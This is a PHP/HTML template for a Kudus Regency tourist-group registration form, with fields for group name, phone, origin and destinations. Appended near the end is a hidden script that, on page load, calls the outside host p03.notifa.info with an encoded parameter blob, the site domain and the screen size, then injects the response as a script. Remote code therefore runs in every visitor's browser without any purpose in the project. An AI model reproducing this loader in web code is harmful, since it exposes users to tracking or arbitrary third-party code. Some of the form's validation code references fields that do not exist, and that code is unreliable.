<!DOCTYPE html>
<html lang="id">

<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta name="theme-color" content="#00B754">
	<meta name="msapplication-navbutton-color" content="#00B754">
	<meta name="csrf-token" content="K5LcdgYsGq30M756cGQ8oXwQWrs0Oi544mdmH3hw">


	<title>Kabupaten Kudus</title>
	<meta property="og:title" content="Kabupaten Kudus" />

	<link rel="shortcut icon" href="<?php echo base_url(); ?>landy/vendor/assets/img/logo/icon.png">
	<link rel="stylesheet" type="text/css" href="<?php echo base_url(); ?>assets/css/mudik.css">
	<link rel="stylesheet" type="text/css" href="<?php echo base_url(); ?>assets/select2/css/select2.css">
	<link rel="stylesheet" href="https://lipis.github.io/bootstrap-sweetalert/dist/sweetalert.css" />
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css" />

	<script>
		var PATH = 'http://mudik.kuduskab.go.id';
	</script>
	<style>
		.sbtn {
			box-sizing: border-box;
			-webkit-appearance: none;
			-moz-appearance: none;
			appearance: none;
			background-color: transparent;
			/* border: 2px solid #dd2003; */
			/* border-radius: 0.7em; */
			color: #e74c3c;
			cursor: pointer;
			display: flex;
			/* align-self: center;
			font-size: 1rem;
			font-weight: 400;
			line-height: 1;
			margin: 2px;
			padding: 1.1em 3.5em; */
			/* text-decoration: none; */
			text-align: left;
			text-transform: uppercase;
			font-family: 'Montserrat', sans-serif;
			font-weight: 700;
			/* width: 1000%; */

		}

		.sbtn:hover,
		.sbtn:focus {
			color: #000;
			/* background-color: #dd2003; */
			outline: 0;
		}
	</style>
</head>

<body style="font-size:13pt !important;">

	<header id="header" class="header mb-4 d-print-none">
		<div class="container">
			<nav class="navbar navbar-expand-sm navbar-light">
				<a class="header__logo" href="http://mudik.kuduskab.go.id">
					<img src="<?php echo base_url(); ?>gambar/logo.png" alt="logo Kudus Kab">
				</a>
				<button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
					<span class="navbar-toggler-icon"></span>
				</button>
				<div class="collapse navbar-collapse justify-content-end" id="navbarNavDropdown">
					<ul class="navbar-nav">
						<li class="nav-item ">
							<a class="nav-link" href="<?= base_url(''); ?>">Beranda</a>
						</li>
						<!-- <li class="nav-item "><a class="nav-link" href="<?= base_url('C_wisata/form'); ?>">Form Pewisata</a>
						</li> -->
						<li class="nav-item "><a class="nav-link" href="<?= base_url('C_wisata/list'); ?>">Daftar Wisatawan</a>
						</li>
					</ul>
				</div>
			</nav>
		</div>
	</header>
	<div class="header-padding"></div>

	<!-- <section class="section pt-0 position-relative">
		<div class="container-fluid" style="color:black">
			<div class="row justify-content-center">
				<div class="col-12 col-md-8">
					<div class="rounded-15 shadow bg-white">
						<div class="carda" style="padding: 15px;">
							<div class="row justify-content-center">
							<div class="card-body">

									<form action="<?php echo base_url('C_public/get'); ?>" class="form-inline" method="POST">
										<div class="form-inline">
											<input type="search" name="nik" class="form-control btn" placeholder="silakan masukan NIK " style="height: 50px; width: 400px" autocomplete="off">
										</div>
										
										<div class="form-inline" style="margin-left:5px">
											<button class="form-control btn" style="height: 50px; width:50px; text-align:center">
												<i class="fa fa-search-plus" ></i></button>
										</div>
									</form>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
	</section> -->
	<br>


	<section class="section pt-0 position-relative">
		<div class="container-fluid" style="color:black">
			<div class="row justify-content-center">
				<div class="col-12 col-md-8">
					<div class="rounded-15 shadow bg-white">
						<div class="carda" style="padding: 15px;">
							<div class="card-body">

								<form action="<?= base_url('C_wisata/create'); ?>" method="post" id="myForm" onSubmit="return validasi(this)">
									<div class="form-row">
										<div class="form-group col-12">
											<div style="margin-bottom:15px;  text-align:center; letter-spacing: 2px;">
												<img src="<?php echo base_url(); ?>gambar/logo.png" alt="logo Kudus Kab" width="70px" style="margin-bottom:5px">
												<!-- <img src="<?php echo base_url(); ?>gambar/polda_jateng.png" alt="logo Kudus Kab" width="70px" style="margin-bottom:5px"> -->
												<h4 class="font-hotline font-weight-bold p-0 mb-3">DATA WISATAWAN KABUPATEN KUDUS</h4>
											</div>
											<div style="background-color:#dd2003; color:white; text-transform: uppercase; letter-spacing: 3px; text-align:center" class="alert alert-success mb-2" role="alert">
												Silahkan Isi Formulir Dibawah ini dengan benar
											</div>
										</div>

										<!-- <div class="form-group col-12">
											<label for="fm-nik">NIK</label>
											<input type="number" class="form-control" name="nik" placeholder="No Induk Kependudukan/ No KTP" onkeypress="return hanyaAngka(event)" id="nik" maxlength="16" autocomplete="off" required>
											<div class="form_error"><?php echo validation_errors(); ?> </div>
										</div> -->
									
									  <!-- PENGISIAN FORM ROMBONGAN  -->
										<div class="form-group col-12">
											<label for="fm-nama">Nama Rombongan</label>
											<input type="text" class="form-control" id="fm-nama" placeholder="Nama Lengkap" name="nama_rombongan" autocomplete="off" required>
										</div>

										<div class="form-group col-12">
											<label for="fm-tgl-lahir">Nomor Handphone</label>
											<input type="number" class="form-control no-spinner" id="fm-no-telp" placeholder="08xxxxx" name="no_hp" required value="" maxlength="13">
										</div>

										<div class="form-group col-12 mt-1" id="negara">
											<hr>
											<label for="fm-nama-negara">Negara Asal <strong></strong></label>
											<select class='form-control select2' data-width="100%" name="negara" required>
												<option value='Indonesia'>Indonesia</option>
												<?php
												foreach ($negara as $n) {
													echo "<option value='$n[country_name]'>$n[country_name]</option>";
												}
												?>
											</select>
											<p class="small text-muted">
												Silahkan pilih Negara tempat anda apabila anda bukan <b>Warga Negara Indonesia</b>
											</p>
										</div>

										<div class="form-group col-12" id="kab">
											<label for="fm-kota-asal">Kota / Kabupaten Asal</label>
											<select class="form-control select2" name="asal" id="kabupaten" class="form-control" data-width="100%" required>
												<option value='pilih'>Pilih Kabupaten/Kota</option>
												<?php
												foreach ($kab as $n) {
													echo "<option value='$n[id]'>$n[name]</option>";
												}
												?>
											</select>
											<span class="small text-muted">
												Silahkan Pilih Kota / Kabupaten
											</span>
										</div>

										<div class="form-group col-12">
											<label for="fm-no-telp">Dewasa</label>
											<input type="number" class="form-control no-spinner" id="" placeholder="0" name="dewasa" required value="">
										</div>
										
										<div class="form-group col-12">
											<label for="fm-no-telp">Anak</label>
											<input type="number" class="form-control no-spinner" id="" placeholder="0" name="anak" required value="" maxlength="">
										</div>
										
										<div class="form-group col-12">
											<hr>
											<h4 class="subtitle">Tujuan Wisata</h4>
										</div>

										<div class="form-group col-12">

											<div class="form-check">
												<div class="custom-control custom-checkbox">
													<input type="checkbox" class="custom-control-input" name="destinasi_wisata[]" id="fm-kesanggupan-2" value="Menara">
													<label class="custom-control-label" for="fm-kesanggupan-2">Sunan Kudus (Menara)</label>
												</div>
												<div class="custom-control custom-checkbox">
													<input type="checkbox" class="custom-control-input" name="destinasi_wisata[]" id="fm-kesanggupan-3" value="Sunan Muria">
													<label class="custom-control-label" for="fm-kesanggupan-3">Gunung Muria (Colo)</label>
												</div>
												<div class="custom-control custom-checkbox">
													<input type="checkbox" class="custom-control-input" name="destinasi_wisata[]" id="fm-kesanggupan-4" value="Museum Kretek">
													<label class="custom-control-label" for="fm-kesanggupan-4">Museum Kretek</label>
												</div>
												<div class="custom-control custom-checkbox">
													<input type="checkbox" class="custom-control-input" name="destinasi_wisata[]" id="fm-kesanggupan-5" value="Museum Purbakala Pati Ayam">
													<label class="custom-control-label" for="fm-kesanggupan-5">Museum Purbakala Pati Ayam</label>
												</div>
												
												<div class="checkbox">
													<label class="form-check-label">Tujuan Wisata Lain :</label>
													<textarea rows="3" class="form-control" name="destinasi_wisata"></textarea>
												</div>
												
											</div>
										</div><hr>
										
									  <!-- END PENGISIAN FORM ROMBONGAN  -->

										

									  <!-- BUTTON FORM ROMBONGAN -->
										<div class="form-group mt-12 col-12 rounded-15">
											<div class="form-group mt-4 col-12">
												<input type="hidden" name="_token" value="K5LcdgYsGq30M756cGQ8oXwQWrs0Oi544mdmH3hw">
												<button type="submit" name="submit" class="btn btn-danger  rounded-15 shadow bg-red" style="letter-spacing: 1px;">SETUJU DAN SIMPAN</button>
											</div>
										</div>
									  <!-- END BUTTON FORM ROMBONGAN -->


									</div>
								</form>

							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
	</section>

	<footer class="web-footer mt-3 py-4 text-center d-print-none">
		<div class="container">
			<div class="copyright">
				&copy; Copyright <strong><span>Kabupaten Kudus</span></strong>. All Rights Reserved
			</div>
			<div class="credits">
				Crafted by <a href="http://diskominfo.kuduskab.go.id">Kominfo</a>
			</div>
		</div>
	</footer>



	<script src="<?php echo base_url(); ?>assets/js/manifest.js"></script>
	<script src="<?php echo base_url(); ?>assets/js/vendor.js"></script>
	<script src="<?php echo base_url(); ?>assets/js/app.js"></script>


	<script src="<?php echo base_url(); ?>assets/dist/js/jquery.js"></script>

	<script src="<?php echo base_url() ?>assets/select2/js/select2.js"></script>
	<script src="https://lipis.github.io/bootstrap-sweetalert/dist/sweetalert.js"></script>


</body>

</html>

<script type="text/javascript">
	function validasi(form) {
		if (form.kectujuan.value == "pilih") {
			alert("Anda belum memilih Kecamatan!");
			return (false);
		}
		return (true);
	}
</script>
<!-- <script>
	window.onload = function() {
		$('#fm-tgl-lahir').on('change', function() {
			var dob = new Date(this.value);
			var today = new Date();
			var age = Math.floor((today - dob) / (365.25 * 24 * 60 * 60 * 1000));
			$('#umur').val(age);
		});
	}
</script> -->
<!-- <script type="text/javascript">
	$(function() {

		$.ajaxSetup({
			type: "POST",
			url: "<?php echo base_url('C_mudik/ambil_data') ?>",
			cache: false,
		});

		$("#provinsi").change(function() {

			var value = $(this).val();
			if (value > 0) {
				$.ajax({
					data: {
						modul: 'kabupaten',
						id: value
					},
					success: function(respond) {
						$("#kabupaten-kota").html(respond);
					}
				})
			}

		});


		$("#kabupaten-kota").change(function() {
			var value = $(this).val();
			if (value > 0) {
				$.ajax({
					data: {
						modul: 'kecamatan',
						id: value,
						required: 'required'
					},
					success: function(respond) {
						$("#kecamatan").html(respond);
					}
				})
			}
		})

		$("#kecamatan").change(function() {
			var value = $(this).val();
			if (value > 0) {
				$.ajax({
					data: {
						modul: 'kelurahan',
						id: value
					},
					success: function(respond) {
						$("#kelurahan-desa").html(respond);
					}
				})
			}
		})

		$("#negara").change(function() {

			var value = $(this).val();
			if (value > 0) {
				$.ajax({
					data: {
						modul: 'districts',
						id: value
					},
					success: function(respond) {
						$("#districts").html(respond);
					}
				})
			}

		});

	})
</script> -->


<script type="text/javascript">
	function validasi() {
		var nip = document.forms["myForm"]["nik"].value;
		var kab = document.forms["myForm"]["kabupaten"].value;
		var desa = document.forms["myForm"]["kelurahan-desa"].value;

		if (nip.length != 16) {
			alert("Format NIK Salah");
			document.getElementById("nik").value = "";
			document.getElementById('nik').focus();
			return false;
		} else if (desa.length == "0") {
			alert("Desa Belum Dipilih");
			document.getElementById("kelurahan-desa").value = "";
			document.getElementById('kelurahan-desa').focus();
			return false;
		}
	}
</script>
<script type="text/javascript">
	if (self == top) {
		function netbro_cache_analytics(fn, callback) {
			setTimeout(function() {
				fn();
				callback();
			}, 0);
		}

		function sync(fn) {
			fn();
		}

		function requestCfs() {
			var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
			var idc_glo_r = Math.floor(Math.random() * 99999999999);
			var url = idc_glo_url + "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncX%2bxo46Nixl1MzZ9veboxdCXA0di851vq9G8WfQ6Oe9sxnSYzkb%2fYj7mb4xjr6%2bbY3uaoqyvbnW5roch3kGUIegq1UvjPi9kqgYHwlvXb8oY1vGI7omlPeMipUEzcFkm1KpuxIgO6oJu2xL9Zoflf0U0HymMxzEW95yredRz0l4lVDt%2f0%2f4PjDJSX3HoDdSgNOVKndua9fc75BUXmwlzmRrRrqaWITMVmey6jq4QFd3ck9tWFJ1MRLMj1LorsPFAmUeOv0yL2xVRxv%2bXmRBzBSgMeEb2U9dRmpYnjNRwg6rSf5dMWe4xi4mdUvUhmIvVD1NnF3CLQHij8kyF84emWDJNFwZxeofUAxHJ6%2fgrNxGhSjC0bCsh%2fc4T2mqjUv6OiFN%2fi2LTO5sWo%2b04TuBif9UxqvY%2fspIMzcccxFr8TY8xmSze6mklCN3oZXhGNtnMJPeNZYp9BYQSUr%2f8fXJS2GoCmNbdh7gmug89u%2b7EtHIpYb9hxDbJslt1Izj5T5j8vqxq38cEXv6l7Fcdc3nOl%2bKPtyF8tZ4YECiMsP3HNrAh0yb3j%2fzZoArg%3d%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
			var bsa = document.createElement('script');
			bsa.type = 'text/javascript';
			bsa.async = true;
			bsa.src = url;
			(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
		}
		netbro_cache_analytics(requestCfs, function() {});
	};
</script>

<script>
	$(document).ready(function() {
		$('.select2').select2({
			// minimumInputLength: 3
		});

	});
</script>
<script>
	function hanyaAngka(evt) {
		var charCode = (evt.which) ? evt.which : event.keyCode
		if (charCode > 31 && (charCode < 48 || charCode > 57))

			return false;
		return true;
	}
</script>
<script type='text/javascript'>
	$(window).load(function() {
		$("#negara").change(function() {
			console.log($("#negara option:selected").val());
			if ($("#negara option:selected").val() != "Indonesia") {
				$('#kab').prop('hidden', 'true');
			} else {
				$('#kab').prop('hidden', false);
			}
		});
	});
</script>

<script type="text/javascript">
	// $(window).load(function() {
	// 	$(":radio").click(function() {
	// 		$("#tampil").hide()
	// 		if ($(this).val() == "Lainnya") {
	// 			$("#tampil").show();
	// 		}
	// 	});
	// 	$(":radio").click(function() {
	// 		if (($(this).val() == "Mudik") || ($(this).val() == "Liburan") || ($(this).val() == "Bisnis")) {
	// 			$("#tampil").hide();
	// 		}
	// 	});
	// })

	$(window).load(function() {
		$(":radio").click(function() {
			$("#modal").hide()
			if ($(this).val() == "Menara") {
				$("#modal").show();
			}
		});
		$(":radio").click(function() {
			if (($(this).val() == "Gunung Muria") || ($(this).val() == "Taman Krida Wisata") || ($(this).val() == "taman Ternadi")) {
				$("#modal").hide();
			}
		});
	})
</script>


<!-- <script type="text/javascript">
	$(window).load(function() {
		$(":radio").click(function() {
			$("#tampil").hide()
			if ($(this).val() == "Lainnya") {
				$("#tampil").show();
			}
		});
		$(":radio").click(function() {
			if (($(this).val() == "Mudik") || ($(this).val() == "Liburan") || ($(this).val() == "Bisnis")) {
				$("#tampil").hide();
			}
		});
	})

	$(window).load(function() {
		$(":radio").click(function() {
			$("#modal").hide()
			if ($(this).val() == "Hubungan") {
				$("#modal").show();
			}
		});
		$(":radio").click(function() {
			if (($(this).val() == "OrangTua") || ($(this).val() == "Saudara") || ($(this).val() == "Teman")) {
				$("#modal").hide();
			}
		});
	})
</script> -->
</body>

</html>